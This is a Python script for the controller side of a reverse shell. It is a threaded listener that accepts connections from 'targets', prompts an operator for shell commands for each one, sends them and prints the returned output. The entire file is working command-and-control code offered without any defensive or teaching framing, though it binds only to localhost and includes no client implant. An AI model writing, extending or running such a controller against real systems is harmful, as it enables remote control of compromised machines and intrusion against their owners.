import socket
import threading
import sys

# Dictionary to track all active client connections
active_clients = {}
client_lock = threading.Lock()
client_counter = 0

def handle_client(connection, address, client_id):
    """
    Handle a single client connection in a separate thread.
    This allows the controller to manage multiple targets simultaneously.
    """
    print(f"\n[+] Connected to Target #{client_id} at {address}")
    
    try:
        while True:
            # Prompt for command input specific to this client
            cmd = input(f"[Target #{client_id}] {address}: shell/> ").encode()
            
            if not cmd.strip():
                continue
            
            # Send the command to the target
            connection.sendall(cmd)
            
            # Receive the response from the target
            # Handle large data by reading until we get the end-of-response marker
            response_data = b''
            while True:
                chunk = connection.recv(4096)
                if not chunk:
                    # Connection closed by target
                    print(f"[!] Target #{client_id} disconnected")
                    return
                
                response_data += chunk
                
                # Check if we've received the complete response
                if b'[END_OF_RESPONSE]' in response_data:
                    break
            
            # Remove the delimiter and decode for display
            response = response_data.replace(b'[END_OF_RESPONSE]\n', b'').decode('utf-8', errors='ignore')
            print(response)
    
    except Exception as e:
        print(f"[!] Error with Target #{client_id}: {e}")
    
    finally:
        # Clean up when client disconnects
        with client_lock:
            if client_id in active_clients:
                del active_clients[client_id]
        connection.close()
        print(f"[!] Target #{client_id} connection closed")


def accept_connections(server_socket):
    """
    Accept incoming client connections in a separate thread.
    Each new connection gets its own handler thread.
    """
    global client_counter
    
    try:
        while True:
            # Block until a connection is received
            connection, address = server_socket.accept()
            
            with client_lock:
                client_counter += 1
                client_id = client_counter
                active_clients[client_id] = (connection, address)
            
            # Create a new thread to handle this client
            client_thread = threading.Thread(
                target=handle_client,
                args=(connection, address, client_id),
                daemon=False
            )
            client_thread.start()
    
    except KeyboardInterrupt:
        print("\n[!] Server shutting down...")


# Create and configure the server socket
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow quick restart

# Bind to localhost and port 9000
server_socket.bind(('127.0.0.1', 9000))

# Listen for incoming connections
server_socket.listen(5)  # Allow up to 5 queued connections
print('[+] Controller is listening for incoming connections...')
print('[+] Waiting for targets to connect...')

try:
    # Start accepting connections in the main thread
    accept_connections(server_socket)

except Exception as e:
    print(f"[!] Server error: {e}")

finally:
    # Graceful shutdown: close all client connections
    with client_lock:
        for client_id, (conn, _) in active_clients.items():
            try:
                conn.close()
            except:
                pass
    
    server_socket.close()
    print("[+] Server shutdown complete")

